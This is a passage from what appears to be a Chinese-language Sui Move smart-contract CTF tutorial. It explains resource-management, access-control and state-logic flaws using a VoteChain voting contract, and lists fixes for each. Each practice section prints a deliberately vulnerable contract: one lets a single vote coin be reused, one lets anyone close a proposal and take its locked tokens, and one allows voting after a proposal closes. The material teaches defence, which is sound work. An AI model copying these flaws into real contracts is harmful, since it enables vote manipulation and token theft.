        let token = VoteToken&lt;T&gt; {
            id: object::new(ctx),
            amount: 100,
        };
        public_transfer(token, sender);
        public_transfer(vote_coin, @0x0);
    }

    public entry fun vote&lt;T&gt;(token: &amp;VoteToken&lt;T&gt;, store: &amp;mut VoteStore, proposal_name: String) {
        assert!(token.amount &gt; 0, 1);
        assert!(object_table::contains(&amp;store.proposals, proposal_name), 2);

        let proposal = object_table::borrow_mut(&amp;mut store.proposals, proposal_name);
        proposal.votes = proposal.votes + token.amount;
    }
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="第4章资源管理"><a class="header" href="#第4章资源管理">第4章：资源管理</a></h1>
<h2 id="引言-3"><a class="header" href="#引言-3">引言</a></h2>
<p>在区块链智能合约中，资源管理是确保系统安全的关键。Sui Move 使用对象（如代币、共享状态）来管理资源，通过 has key、Coin 和 share_object 提供强大的控制能力。然而，错误的资源管理可能导致漏洞，如代币重复使用。本章将介绍 Sui Move 的资源管理，以 VoteChain 投票系统为例，探讨未正确销毁投票代币的漏洞，学习如何利用和修复此类问题。</p>
<p>通过本章，你将：</p>
<ul>
<li>了解 Sui Move 的对象和代币管理。</li>
<li>掌握资源管理漏洞，如未销毁代币导致重复投票。</li>
<li>学会在 CTF 中发现和修复资源管理问题。</li>
</ul>
<p>我们将分析 chapter_4::vote 中的重复投票漏洞，实践操纵投票结果，并在任务中修复代币管理。</p>
<hr />
<h2 id="1-sui-move-的资源管理"><a class="header" href="#1-sui-move-的资源管理">1. Sui Move 的资源管理</a></h2>
<h3 id="11-对象与代币"><a class="header" href="#11-对象与代币">1.1 对象与代币</a></h3>
<p>Sui Move 的资源以对象形式存储，具备唯一标识（UID）：</p>
<ul>
<li>对象类型：需 has key（唯一性）和 has store（可存储）。</li>
<li>所有权：通过 public_transfer 转移，share_object 公开共享。</li>
<li>代币：Coin<T> 表示代币，需销毁（coin::burn）或分割（coin::split）以防止重复使用。</li>
</ul>
<p>在 VoteChain 中：</p>
<ul>
<li>Coin<VOTE> 是投票代币，代表投票权。</li>
<li>VoteStore 是共享对象，存储提案票数。</li>
</ul>
<h3 id="12-资源管理漏洞"><a class="header" href="#12-资源管理漏洞">1.2 资源管理漏洞</a></h3>
<p>常见的资源管理漏洞包括：</p>
<ul>
<li>未销毁代币：投票后未销毁 Coin<VOTE>，允许重复使用。</li>
<li>错误转移：对象转移到错误地址，丢失控制。</li>
<li>共享对象滥用：未限制 share_object 的访问（第5章讨论）。</li>
</ul>
<p>这些漏洞可能导致投票操纵或资源滥用。</p>
<h3 id="13-漏洞案例"><a class="header" href="#13-漏洞案例">1.3 漏洞案例</a></h3>
<p>在 VoteChain 的 chapter_4::vote 中：</p>
<ul>
<li>vote 函数记录投票者，但未销毁或分割 Coin<VOTE>。</li>
<li>攻击者可多次调用 vote，用同一代币增加票数，操纵提案结果。</li>
<li>危害：投票系统公平性丧失。</li>
</ul>
<hr />
<h2 id="2-防御资源管理漏洞"><a class="header" href="#2-防御资源管理漏洞">2. 防御资源管理漏洞</a></h2>
<h3 id="21-销毁或分割代币"><a class="header" href="#21-销毁或分割代币">2.1 销毁或分割代币</a></h3>
<ul>
<li>在 vote 中销毁 Coin<VOTE>（coin::burn）或分割已用部分（coin::split）。</li>
<li>示例：coin::burn(vote_coin);</li>
</ul>
<h3 id="22-验证状态"><a class="header" href="#22-验证状态">2.2 验证状态</a></h3>
<ul>
<li>检查代币是否有效（如 vote_coin.value() &gt; 0）。</li>
<li>记录投票状态（如 voters 列表），防止重复投票。</li>
</ul>
<h3 id="23-最小化共享对象"><a class="header" href="#23-最小化共享对象">2.3 最小化共享对象</a></h3>
<ul>
<li>减少 share_object 的敏感数据，仅存储必要信息（如票数）。</li>
<li>使用用户拥有的对象（如代币）管理权限。</li>
</ul>
<hr />
<div style="break-before: page; page-break-before: always;"></div><h1 id="了解资源管理问题"><a class="header" href="#了解资源管理问题">了解资源管理问题</a></h1>
<h2 id="引言-4"><a class="header" href="#引言-4">引言</a></h2>
<p>在区块链智能合约中，资源管理是确保系统安全的关键。Sui Move 使用对象（如代币、共享状态）来管理资源，通过 has key、Coin 和 share_object 提供强大的控制能力。然而，错误的资源管理可能导致漏洞，如代币重复使用。本章将介绍 Sui Move 的资源管理，以 VoteChain 投票系统为例，探讨未正确销毁投票代币的漏洞，学习如何利用和修复此类问题。</p>
<p>通过本章，你将：</p>
<ul>
<li>了解 Sui Move 的对象和代币管理。</li>
<li>掌握资源管理漏洞，如未销毁代币导致重复投票。</li>
<li>学会在 CTF 中发现和修复资源管理问题。</li>
</ul>
<p>我们将分析 chapter_4::vote 中的重复投票漏洞，实践操纵投票结果，并在任务中修复代币管理。</p>
<hr />
<h2 id="1-sui-move-的资源管理-1"><a class="header" href="#1-sui-move-的资源管理-1">1. Sui Move 的资源管理</a></h2>
<h3 id="11-对象与代币-1"><a class="header" href="#11-对象与代币-1">1.1 对象与代币</a></h3>
<p>Sui Move 的资源以对象形式存储，具备唯一标识（UID）：</p>
<ul>
<li>对象类型：需 has key（唯一性）和 has store（可存储）。</li>
<li>所有权：通过 public_transfer 转移，share_object 公开共享。</li>
<li>代币：Coin<T> 表示代币，需销毁（coin::burn）或分割（coin::split）以防止重复使用。</li>
</ul>
<p>在 VoteChain 中：</p>
<ul>
<li>Coin<VOTE> 是投票代币，代表投票权。</li>
<li>VoteStore 是共享对象，存储提案票数。</li>
</ul>
<h3 id="12-资源管理漏洞-1"><a class="header" href="#12-资源管理漏洞-1">1.2 资源管理漏洞</a></h3>
<p>常见的资源管理漏洞包括：</p>
<ul>
<li>未销毁代币：投票后未销毁 Coin<VOTE>，允许重复使用。</li>
<li>错误转移：对象转移到错误地址，丢失控制。</li>
<li>共享对象滥用：未限制 share_object 的访问（第5章讨论）。</li>
</ul>
<p>这些漏洞可能导致投票操纵或资源滥用。</p>
<h3 id="13-漏洞案例-1"><a class="header" href="#13-漏洞案例-1">1.3 漏洞案例</a></h3>
<p>在 VoteChain 的 chapter_4::vote 中：</p>
<ul>
<li>vote 函数记录投票者，但未销毁或分割 Coin<VOTE>。</li>
<li>攻击者可多次调用 vote，用同一代币增加票数，操纵提案结果。</li>
<li>危害：投票系统公平性丧失。</li>
</ul>
<hr />
<h2 id="2-防御资源管理漏洞-1"><a class="header" href="#2-防御资源管理漏洞-1">2. 防御资源管理漏洞</a></h2>
<h3 id="21-销毁或分割代币-1"><a class="header" href="#21-销毁或分割代币-1">2.1 销毁或分割代币</a></h3>
<ul>
<li>在 vote 中销毁 Coin<VOTE>（coin::burn）或分割已用部分（coin::split）。</li>
<li>示例：coin::burn(vote_coin);</li>
</ul>
<h3 id="22-验证状态-1"><a class="header" href="#22-验证状态-1">2.2 验证状态</a></h3>
<ul>
<li>检查代币是否有效（如 vote_coin.value() &gt; 0）。</li>
<li>记录投票状态（如 voters 列表），防止重复投票。</li>
</ul>
<h3 id="23-最小化共享对象-1"><a class="header" href="#23-最小化共享对象-1">2.3 最小化共享对象</a></h3>
<ul>
<li>减少 share_object 的敏感数据，仅存储必要信息（如票数）。</li>
<li>使用用户拥有的对象（如代币）管理权限。</li>
</ul>
<hr />
<div style="break-before: page; page-break-before: always;"></div><h1 id="实践分析利用资源管理漏洞"><a class="header" href="#实践分析利用资源管理漏洞">实践：分析利用资源管理漏洞</a></h1>
<pre><code>module chapter_4::vote {
    use sui::coin::{Self, Coin, TreasuryCap};
    use sui::transfer::{public_transfer, share_object, public_freeze_object};
    use sui::vec_map::{Self, VecMap};
    use sui::object_table::{Self, ObjectTable};
    use std::string::String;

    public struct VOTE has drop {}

    public struct Votecap has key {
        id: UID,
        cap: TreasuryCap&lt;VOTE&gt;,
    }

    public struct Mintlist has key {
        id: UID,
        mintlist: VecMap&lt;address, u64&gt;,
    }

    public struct VoteStore has key {
        id: UID,
        proposals: ObjectTable&lt;String, Proposal&gt;,
        voters: VecMap&lt;address, bool&gt;, 
    }

    public struct Proposal has key, store {
        id: UID,
        votes: u64,
    }

    const E_INVALID_AMOUNT: u64 = 1;
    const E_INVALID_PROPOSAL: u64 = 2;
    const E_ALREADY_MINTED: u64 = 3;

    fun init(witness: VOTE, ctx: &amp;mut TxContext) {
        let name = std::string::utf8(b"letsctf");
        let (treasury_cap, meta) = coin::create_currency(
            witness,
            6,
            b"VOTE",
            b"VOTE",
            b"",
            option::none(),
            ctx
        );

        let vote_cap = Votecap { id: object::new(ctx), cap: treasury_cap };
        let mintlist = Mintlist { id: object::new(ctx), mintlist: vec_map::empty() };
        let mut store = VoteStore {
            id: object::new(ctx),
            proposals: object_table::new(ctx),
            voters: vec_map::empty(),
        };

        let proposal = Proposal {
            id: object::new(ctx),
            votes: 0,
        };

        object_table::add(&amp;mut store.proposals, name, proposal);
        public_freeze_object(meta);
        share_object(vote_cap);
        share_object(mintlist);
        share_object(store);
    }

    public entry fun mint(
        vote_cap: &amp;mut Votecap,
        mint_list: &amp;mut Mintlist,
        ctx: &amp;mut TxContext
    ) {
        let addr = tx_context::sender(ctx);
        assert!(!vec_map::contains(&amp;mint_list.mintlist, &amp;addr), E_ALREADY_MINTED);
        let coin = coin::mint(&amp;mut vote_cap.cap, 100, ctx);
        vec_map::insert(&amp;mut mint_list.mintlist, addr, 100);
        public_transfer(coin, addr);
    }

    public entry fun vote(
        store: &amp;mut VoteStore,
        vote_coin: &amp;Coin&lt;VOTE&gt;,
        proposal_name: String,
        ctx: &amp;mut TxContext
    ) {
        assert!(vote_coin.value() &gt; 0, E_INVALID_AMOUNT);
        assert!(object_table::contains(&amp;store.proposals, proposal_name), E_INVALID_PROPOSAL);
        let sender = tx_context::sender(ctx);
        if (!vec_map::contains(&amp;store.voters, &amp;sender)) {
            vec_map::insert(&amp;mut store.voters, sender, true);
        };
        let proposal = object_table::borrow_mut(&amp;mut store.proposals, proposal_name);
        proposal.votes = proposal.votes + vote_coin.value();
    }
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="第5节权限与访问控制"><a class="header" href="#第5节权限与访问控制">第5节：权限与访问控制</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="了解权限与访问控制"><a class="header" href="#了解权限与访问控制">了解权限与访问控制</a></h1>
<h2 id="引言-5"><a class="header" href="#引言-5">引言</a></h2>
<p>权限控制是区块链智能合约安全的核心。Sui Move 使用 <code>TxContext</code> 的 <code>tx_context::sender</code> 获取调用者地址，验证用户权限。然而，遗漏身份验证可能导致未授权访问，如篡改他人提案。本章介绍 Sui Move 的权限控制机制，以 VoteChain 投票系统为例，分析未验证调用者身份的漏洞，学习如何利用和修复此类问题。</p>
<p>通过本章，你将：</p>
<ul>
<li>了解 Sui Move 的 <code>TxContext</code> 权限验证。</li>
<li>掌握未授权访问漏洞，如提案篡改。</li>
<li>学会在 CTF 中发现和修复权限控制问题。</li>
</ul>
<p>我们将分析 <code>chapter_5::vote</code> 中的提案关闭漏洞，实践窃取投票权，并在任务中修复权限管理。</p>
<hr />
<h2 id="1-sui-move-的权限控制"><a class="header" href="#1-sui-move-的权限控制">1. Sui Move 的权限控制</a></h2>
<h3 id="11-使用-txcontext-验证身份"><a class="header" href="#11-使用-txcontext-验证身份">1.1 使用 TxContext 验证身份</a></h3>
<p>Sui Move 通过 <code>TxContext</code> 管理权限：</p>
<ul>
<li><code>tx_context::sender(ctx)</code>：返回交易调用者地址，用于验证身份。</li>
<li>断言（如 <code>assert!</code>）确保调用者是授权用户，如提案创建者。</li>
</ul>
<h3 id="12-未授权访问的危害"><a class="header" href="#12-未授权访问的危害">1.2 未授权访问的危害</a></h3>
<p>常见漏洞包括：</p>
<ul>
<li>未验证调用者：允许任意用户执行敏感操作，如关闭提案。</li>
<li>错误验证：逻辑错误导致权限绕过。</li>
<li>共享对象滥用：未限制 <code>share_object</code> 访问。</li>
</ul>
<p>这些漏洞可能导致资产窃取或系统篡改。</p>
<h3 id="13-votechain-的提案关闭漏洞"><a class="header" href="#13-votechain-的提案关闭漏洞">1.3 VoteChain 的提案关闭漏洞</a></h3>
<p>在 <code>chapter_5::vote</code> 中：</p>
<ul>
<li><code>close_proposal</code> 未验证 <code>tx_context::sender</code> 是否为 <code>proposal.owner</code>。</li>
<li>攻击者可关闭他人提案，窃取锁定的 <code>Coin&lt;VOTE&gt;</code>。</li>
<li>危害：投票系统公平性受损，提案创建者损失投票权。</li>
</ul>
<hr />
<h2 id="2-防御权限控制漏洞"><a class="header" href="#2-防御权限控制漏洞">2. 防御权限控制漏洞</a></h2>
<h3 id="21-实现权限检查"><a class="header" href="#21-实现权限检查">2.1 实现权限检查</a></h3>
<ul>
<li>使用 <code>assert!</code> 检查 <code>tx_context::sender</code> 是否为预期用户。</li>
<li>示例：assert!(proposal.owner == tx_context::sender(ctx), E_UNAUTHORIZED);</li>
</ul>
<h3 id="22-限制敏感操作"><a class="header" href="#22-限制敏感操作">2.2 限制敏感操作</a></h3>
<ul>
<li>限制函数访问，仅授权必要用户（如提案创建者）。</li>
<li>避免公开敏感操作。</li>
</ul>
<h3 id="23-结合状态增强安全"><a class="header" href="#23-结合状态增强安全">2.3 结合状态增强安全</a></h3>
<ul>
<li>结合状态验证（如提案是否关闭）增强权限控制。</li>
</ul>
<hr />
<h2 id="3-ctf-中的权限漏洞"><a class="header" href="#3-ctf-中的权限漏洞">3. CTF 中的权限漏洞</a></h2>
<h3 id="31-ctf-中的权限漏洞"><a class="header" href="#31-ctf-中的权限漏洞">3.1 CTF 中的权限漏洞</a></h3>
<p>权限控制漏洞在 CTF 中常见：</p>
<ul>
<li>未授权访问：关闭他人提案，窃取资产。</li>
<li>权限绕过：利用逻辑错误执行敏感操作。</li>
</ul>
<p>在 VoteChain，攻击者可窃取提案的 <code>Coin&lt;VOTE&gt;</code>，破坏系统。</p>
<h3 id="32-利用与修复权限漏洞"><a class="header" href="#32-利用与修复权限漏洞">3.2 利用与修复权限漏洞</a></h3>
<p>在 <strong>实践</strong>（<code>practice.md</code>），你将：</p>
<ul>
<li>利用 <code>close_proposal</code> 漏洞，关闭他人提案，窃取 <code>Coin&lt;VOTE&gt;</code>。</li>
<li>分析漏洞危害，理解权限控制的重要性。</li>
</ul>
<p>在 <strong>任务5</strong>（<code>task5.md</code>），你将：</p>
<ul>
<li>修复 <code>close_proposal</code>，添加调用者验证。</li>
<li>测试修复，确保未授权访问失效。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="实践分析权限控制漏洞"><a class="header" href="#实践分析权限控制漏洞">实践：分析权限控制漏洞</a></h1>
<pre><code>module chapter_5::vote {
    use sui::coin::{Self, Coin, TreasuryCap};
    use sui::transfer::{public_transfer, share_object, public_freeze_object};
    use sui::vec_map::{Self, VecMap};
    use sui::object_table::{Self, ObjectTable};
    use std::string::String;
    use sui::balance::Balance;
    use sui::balance::zero;
    use sui::coin::into_balance;
    use sui::coin::from_balance;

    public struct VOTE has drop {}

    public struct Votecap has key {
        id: UID,
        cap: TreasuryCap&lt;VOTE&gt;,
    }

    public struct Mintlist has key {
        id: UID,
        mintlist: VecMap&lt;address, u64&gt;,
    }

    public struct VoteStore has key {
        id: UID,
        proposals: ObjectTable&lt;String, Proposal&gt;,
        voters: VecMap&lt;address, u64&gt;,
    }

    public struct Proposal has key, store {
        id: UID,
        owner: address,
        votes: u64,
        locked_tokens: Balance&lt;VOTE&gt;,
        closed: bool,
    }

    const E_INVALID_AMOUNT: u64 = 1;
    const E_INVALID_PROPOSAL: u64 = 2;
    const E_ALREADY_MINTED: u64 = 3;
    const E_ALREADY_VOTE: u64 = 4;
    const E_PROPOSAL_CLOSED: u64 = 5;

    fun init(witness: VOTE, ctx: &amp;mut TxContext) {
        let (treasury_cap, meta) = coin::create_currency(
            witness, 6, b"VOTE", b"VOTE", b"", option::none(), ctx
        );

        let vote_cap = Votecap { id: object::new(ctx), cap: treasury_cap };
        let mintlist = Mintlist { id: object::new(ctx), mintlist: vec_map::empty() };
        let store = VoteStore {
            id: object::new(ctx),
            proposals: object_table::new(ctx),
            voters: vec_map::empty(),
        };

        public_freeze_object(meta);
        share_object(vote_cap);
        share_object(mintlist);
        share_object(store);
    }

    public entry fun mint(
        vote_cap: &amp;mut Votecap,
        mint_list: &amp;mut Mintlist,
        ctx: &amp;mut TxContext
    ) {
        let addr = tx_context::sender(ctx);
        assert!(!vec_map::contains(&amp;mint_list.mintlist, &amp;addr), E_ALREADY_MINTED);
        let coin = coin::mint(&amp;mut vote_cap.cap, 100, ctx);
        vec_map::insert(&amp;mut mint_list.mintlist, addr, 100);
        public_transfer(coin, addr);
    }

    public entry fun create_proposal(
        store: &amp;mut VoteStore,
        name: String,
        ctx: &amp;mut TxContext
    ) {
        assert!(!object_table::contains(&amp;store.proposals, name), E_INVALID_PROPOSAL);
        let proposal = Proposal {
            id: object::new(ctx),
            owner: tx_context::sender(ctx),
            votes: 0,
            locked_tokens: zero&lt;VOTE&gt;(),
            closed: false,
        };
        object_table::add(&amp;mut store.proposals, name, proposal);
    }

    public entry fun vote(
        store: &amp;mut VoteStore,
        vote_coin: Coin&lt;VOTE&gt;,
        proposal_name: String,
        ctx: &amp;mut TxContext
    ) {
        assert!(vote_coin.value() &gt; 0, E_INVALID_AMOUNT);
        assert!(object_table::contains(&amp;store.proposals, proposal_name), E_INVALID_PROPOSAL);
        let proposal = object_table::borrow_mut(&amp;mut store.proposals, proposal_name);
        assert!(!proposal.closed, E_PROPOSAL_CLOSED);
        let sender = tx_context::sender(ctx);
        assert!(!vec_map::contains(&amp;store.voters, &amp;sender),E_ALREADY_VOTE);
        vec_map::insert(&amp;mut store.voters, sender, vote_coin.value());
        let amount = into_balance(vote_coin);
        proposal.votes = proposal.votes + amount.value();
        proposal.locked_tokens.join(amount);
    }

    public entry fun close_proposal(
        store: &amp;mut VoteStore,
        proposal_name: String,
        ctx: &amp;mut TxContext
    ) {
        assert!(object_table::contains(&amp;store.proposals, proposal_name), E_INVALID_PROPOSAL);
        let proposal = object_table::borrow_mut(&amp;mut store.proposals, proposal_name);
        assert!(!proposal.closed, E_PROPOSAL_CLOSED);
        proposal.closed = true;
        let coin = from_balance(proposal.locked_tokens.withdraw_all(), ctx);
        public_transfer(coin, tx_context::sender(ctx));
    }
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="第6节高级move特性"><a class="header" href="#第6节高级move特性">第6节：高级Move特性</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="逻辑漏洞与状态管理"><a class="header" href="#逻辑漏洞与状态管理">逻辑漏洞与状态管理</a></h1>
<h2 id="引言-6"><a class="header" href="#引言-6">引言</a></h2>
<p>逻辑漏洞源于智能合约的状态管理不当，可能导致意外行为，如重复投票。Sui Move 使用 <code>share_object</code> 和 <code>VecMap</code> 管理状态，但错误的状态更新或检查可能破坏系统。本章介绍 Sui Move 的状态管理机制，以 VoteChain 投票系统为例，分析未正确管理投票状态的逻辑漏洞，学习如何利用和修复此类问题。</p>
<p>通过本章，你将：</p>
<ul>
<li>了解 Sui Move 的状态管理（如 <code>VecMap</code> 和 <code>ObjectTable</code>）。</li>
<li>掌握逻辑漏洞，如重复投票。</li>
<li>学会在 CTF 中发现和修复状态管理问题。</li>
</ul>
<p>我们将分析 <code>chapter_6::vote</code> 中的重复投票漏洞，实践操纵投票结果，并在任务中修复状态逻辑。</p>
<hr />
<h2 id="1-sui-move-的状态管理"><a class="header" href="#1-sui-move-的状态管理">1. Sui Move 的状态管理</a></h2>
<h3 id="11-状态管理机制"><a class="header" href="#11-状态管理机制">1.1 状态管理机制</a></h3>
<p>Sui Move 通过对象和集合管理状态：</p>
<ul>
<li><code>share_object</code>：存储共享状态，如 <code>VoteStore</code>。</li>
<li><code>ObjectTable</code> 和 <code>VecMap</code>：管理提案和投票记录。</li>
<li><code>TxContext</code>：提供交易上下文，确保状态一致性。</li>
</ul>
<h3 id="12-逻辑漏洞的来源"><a class="header" href="#12-逻辑漏洞的来源">1.2 逻辑漏洞的来源</a></h3>
<p>常见逻辑漏洞包括：</p>
<ul>
<li>未检查状态：如允许关闭的提案继续投票。</li>
<li>错误更新状态：如重复累加投票记录。</li>
<li>状态重置错误：如投票记录未正确清理。</li>
</ul>
<p>这些漏洞可能导致投票操纵或系统失效。</p>
<h3 id="13-votechain-的重复投票漏洞"><a class="header" href="#13-votechain-的重复投票漏洞">1.3 VoteChain 的重复投票漏洞</a></h3>
<p>在 <code>chapter_6::vote</code> 中：</p>
<ul>
<li><code>vote</code> 未检查 <code>proposal.closed</code>，允许关闭后投票。</li>
<li><code>voters</code> 记录错误累加投票金额，未防止重复投票。</li>
<li>危害：攻击者可反复投票，操纵提案结果。</li>
</ul>
<hr />
<h2 id="2-防御逻辑漏洞"><a class="header" href="#2-防御逻辑漏洞">2. 防御逻辑漏洞</a></h2>
<h3 id="21-验证状态一致性"><a class="header" href="#21-验证状态一致性">2.1 验证状态一致性</a></h3>
<ul>
<li>检查关键状态（如 <code>proposal.closed</code>）防止非法操作。</li>
<li>示例：assert!(!proposal.closed, E_PROPOSAL_CLOSED);</li>
</ul>
<h3 id="22-正确更新状态"><a class="header" href="#22-正确更新状态">2.2 正确更新状态</a></h3>
<ul>
<li>使用 <code>VecMap</code> 或 <code>VecSet</code> 精确记录投票状态。</li>
<li>示例：assert!(!vec_map::contains(&amp;store.voters, &amp;sender),E_ALREADY_VOTE);防止重复投票。</li>
</ul>
<h3 id="23-最小化状态暴露"><a class="header" href="#23-最小化状态暴露">2.3 最小化状态暴露</a></h3>
<ul>
<li>减少公开状态（如 <code>share_object</code> 的敏感数据）。</li>
<li>定期清理无用状态（如关闭提案）。</li>
</ul>
<hr />
<h2 id="3-ctf-中的逻辑漏洞"><a class="header" href="#3-ctf-中的逻辑漏洞">3. CTF 中的逻辑漏洞</a></h2>
<h3 id="31-ctf-中的逻辑漏洞"><a class="header" href="#31-ctf-中的逻辑漏洞">3.1 CTF 中的逻辑漏洞</a></h3>
<p>逻辑漏洞在 CTF 中常见：</p>
<ul>
<li>重复操作：如重复投票或提取资产。</li>
<li>状态绕过：如在非法状态下执行操作。</li>
</ul>
<p>在 VoteChain，攻击者可通过重复投票操纵结果。</p>
<h3 id="32-利用与修复逻辑漏洞"><a class="header" href="#32-利用与修复逻辑漏洞">3.2 利用与修复逻辑漏洞</a></h3>
<p>在 <strong>实践</strong>（<code>practice.md</code>），你将：</p>
<ul>
<li>利用 <code>vote</code> 漏洞，在提案关闭后重复投票。</li>
<li>分析漏洞危害，理解状态管理。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="实践分析状态管理逻辑漏洞"><a class="header" href="#实践分析状态管理逻辑漏洞">实践：分析状态管理逻辑漏洞</a></h1>
<pre><code>module chapter_6::vote {
    use sui::coin::{Self, Coin, TreasuryCap};
    use sui::transfer::{public_transfer, share_object, public_freeze_object};
    use sui::vec_map::{Self, VecMap};
    use sui::object_table::{Self, ObjectTable};
    use std::string::String;
    use sui::balance::Balance;

    public struct VOTE has drop {}

    public struct Votecap has key {
        id: UID,
        cap: TreasuryCap&lt;VOTE&gt;,
    }

    public struct Mintlist has key {
        id: UID,
        mintlist: VecMap&lt;address, u64&gt;,
    }

    public struct VoteStore has key {
        id: UID,
        proposals: ObjectTable&lt;String, Proposal&gt;,
        voters: VecMap&lt;address, u64&gt;,
    }

    public struct Proposal has key, store {
        id: UID,
        owner: address,
        votes: u64,
        locked_tokens: Balance&lt;VOTE&gt;,
        closed: bool,
    }

    const E_INVALID_AMOUNT: u64 = 1;
    const E_INVALID_PROPOSAL: u64 = 2;
    const E_ALREADY_MINTED: u64 = 3;
    const E_UNAUTHORIZED: u64 = 4;
    const E_PROPOSAL_CLOSED: u64 = 5;

    fun init(witness: VOTE, ctx: &amp;mut TxContext) {
        let (treasury_cap, meta) = coin::create_currency(
            witness, 6, b"VOTE", b"VOTE", b"", option::none(), ctx
        );

        let vote_cap = Votecap { id: object::new(ctx), cap: treasury_cap };
        let mintlist = Mintlist { id: object::new(ctx), mintlist: vec_map::empty() };
        let store = VoteStore {
            id: object::new(ctx),
            proposals: object_table::new(ctx),
            voters: vec_map::empty(),
        };


        public_freeze_object(meta);
        share_object(vote_cap);
        share_object(mintlist);
        share_object(store);
    }

    public entry fun mint(
        vote_cap: &amp;mut Votecap,
        mint_list: &amp;mut Mintlist,
        ctx: &amp;mut TxContext
    ) {
        let addr = tx_context::sender(ctx);
        assert!(!vec_map::contains(&amp;mint_list.mintlist, &amp;addr), E_ALREADY_MINTED);
        let coin = coin::mint(&amp;mut vote_cap.cap, 100, ctx);
        vec_map::insert(&amp;mut mint_list.mintlist, addr, 100);
        public_transfer(coin, addr);
    }

    public entry fun create_proposal(
        store: &amp;mut VoteStore,
        name: String,
        ctx: &amp;mut TxContext
    ) {
        assert!(!object_table::contains(&amp;store.proposals, name), E_INVALID_PROPOSAL);
        let proposal = Proposal {
            id: object::new(ctx),
            owner: tx_context::sender(ctx),
            votes: 0,
            locked_tokens: zero&lt;VOTE&gt;(),
            closed: false,
        };
        object_table::add(&amp;mut store.proposals, name, proposal);
    }

    public entry fun vote(
        store: &amp;mut VoteStore,
        vote_coin: Coin&lt;VOTE&gt;,
        proposal_name: String,
        ctx: &amp;mut TxContext
    ) {
        assert!(vote_coin.value() &gt; 0, E_INVALID_AMOUNT);
        assert!(object_table::contains(&amp;store.proposals, proposal_name), E_INVALID_PROPOSAL);
        let proposal = object_table::borrow_mut(&amp;mut store.proposals, proposal_name);
        let sender = tx_context::sender(ctx);
        let amount = coin::into_balance(vote_coin);
        if (vec_map::contains(&amp;store.voters, &amp;sender)) {
            let voter_amount = vec_map::get_mut(&amp;mut store.voters, &amp;sender);
            *voter_amount = *voter_amount + amount.value();
        } else {
            vec_map::insert(&amp;mut store.voters, sender, amount.value());
        };
        proposal.votes = proposal.votes + amount.value();
        proposal.locked_tokens.join(amount);
    }

    public entry fun close_proposal(
        store: &amp;mut VoteStore,
        proposal_name: String,
        ctx: &amp;mut TxContext
    ) {
        assert!(object_table::contains(&amp;store.proposals, proposal_name), E_INVALID_PROPOSAL);
        let proposal = object_table::borrow_mut(&amp;mut store.proposals, proposal_name);
        let sender = tx_context::sender(ctx);
        assert!(sender == proposal.owner, E_UNAUTHORIZED);
        assert!(!proposal.closed, E_PROPOSAL_CLOSED);
        proposal.closed = true;
        let coin = coin::from_balance(proposal.locked_tokens.withdraw_all(), ctx);
        public_transfer(coin, sender);
    }
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="第7节智能合约交互"><a class="header" href="#第7节智能合约交互">第7节：智能合约交互</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h2 id="引言-7"><a class="header" href="#引言-7">引言</a></h2>
<p>在Sui Move智能合约开发中，模块间的交互是构建复杂应用的基础。然而，这种交互也引入了新的安全风险。本章将深入探讨跨合约交互的安全问题，分析潜在风险，并提供实用的防御策略。</p>
<h2 id="1-sui中跨合约交互"><a class="header" href="#1-sui中跨合约交互">1. Sui中跨合约交互</a></h2>
<h3 id="11-跨合约交互的基本概念"><a class="header" href="#11-跨合约交互的基本概念">1.1 跨合约交互的基本概念</a></h3>
<p>跨合约交互是指一个智能合约模块调用或访问另一个模块的功能或资源。在Sui Move中，这种交互通过以下方式实现：</p>
<p>模块导入：使用use关键字导入其他模块的功能。</p>
<pre><code class="language-move">use game::inventory::{Self, Sword, Armor};
</code></pre>
<p>友元关系：通过friend关键字建立模块间的特权访问。</p>
<pre><code class="language-move">friend game::adventure;
</code></pre>
<p>公共接口：通过public函数提供对外服务。</p>
<pre><code class="language-move">public fun remove_sword(hero: &amp;mut Hero): Sword {
    assert!(option::is_some(&amp;hero.sword), ENO_SWORD);
    option::extract(&amp;mut hero.sword)
}
</code></pre>
<p>对象传递：在模块间传递和操作对象。</p>
<pre><code class="language-move">let sword = inventory::create_sword(ctx);
hero::equip_or_levelup_sword(hero, sword, ctx);
</code></pre>
<h3 id="12-跨合约交互的应用场景"><a class="header" href="#12-跨合约交互的应用场景">1.2 跨合约交互的应用场景</a></h3>
<p>在Sui Move生态系统中，跨合约交互广泛应用于：</br>
组合式应用：将功能分解为多个专用模块，如游戏系统中的英雄、装备和冒险模块。</br>
标准库集成：与Sui标准库（如sui::object、sui::transfer）交互。</br>
协议互操作：DeFi协议间的流动性共享和资产交换。</br>
权限管理：通过专用模块实现访问控制和权限验证。</p>
<h3 id="13-跨合约交互的特点"><a class="header" href="#13-跨合约交互的特点">1.3 跨合约交互的特点</a></h3>
<p>模块边界：Sui Move强制执行严格的模块边界，限制对内部状态的直接访问。</br>
能力约束：对象的传递和操作受能力系统（如key、store）约束。</br>
类型安全：编译时类型检查确保交互的类型兼容性。</br>
可见性控制：通过public、public(friend)和public(package)控制函数访问权限。</p>
<h2 id="2-跨模块交互的风险分析"><a class="header" href="#2-跨模块交互的风险分析">2. 跨模块交互的风险分析</a></h2>
<h3 id="21-信任边界问题"><a class="header" href="#21-信任边界问题">2.1 信任边界问题</a></h3>
<p>跨合约交互引入了信任边界，当一个模块调用另一个模块时，调用方需要信任被调用方的实现。这种信任可能导致以下风险：</p>
<p>接口滥用：攻击者可能以非预期方式调用公共接口。例如，在游戏系统中，如果create_sword函数没有适当的访问控制：</p>
<pre><code class="language-move">// 风险：任何人都可以创建武器
public fun create_sword(_ctx: &amp;mut TxContext): Sword {
    Sword {
        rarity: 1,
        strength: BASE_SWORD_STRENGTH,
    }
}
</code></pre>
<p>状态不一致：模块间状态同步失败可能导致系统不一致。例如，如果英雄打怪兽结束后没有更新英雄的一些属性值：</p>
<pre><code class="language-move">// 英雄的HP在战斗过程中会在本地变量hero_hp中减少，但是这些变化并没有被写回到Hero对象中，
// 这导致战斗结束后英雄应该受到的伤害没有持久化到其状态中
